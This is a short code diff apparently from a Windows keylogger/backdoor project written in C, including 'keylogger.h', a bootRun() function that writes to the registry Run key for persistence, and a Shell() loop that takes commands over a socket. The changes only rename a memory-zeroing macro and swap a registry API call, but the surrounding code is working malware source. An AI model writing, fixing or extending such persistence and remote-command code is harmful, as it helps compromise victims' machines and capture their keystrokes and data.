@@ -10,7 +10,7 @@
 #include <sys/types.h>
 #include "keylogger.h"
 
-#define ZeroMemory(p, size) (void) memset((p), 0, (size))
+#define bzero(p, size) (void) memset((p), 0, (size))
 
 int sock;
 
@@ -29,7 +29,7 @@ int bootRun() {
 
     HKEY NewVal;
 
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
         send(sock, err, sizeof(err), 0);
         return -1;
     }
@@ -103,9 +103,9 @@ void Shell() {
 
     while (1) {
 
-        ZeroMemory(buffer, sizeof(buffer));
-        ZeroMemory(container, sizeof(container));
-        ZeroMemory(total_response, sizeof(total_response));
+        bzero(buffer, sizeof(buffer));
+        bzero(container, sizeof(container));
+        bzero(total_response, sizeof(total_response));
         int recv_size = recv(sock, buffer, sizeof(buffer), 0);
 
         if (recv_size <= 0) {
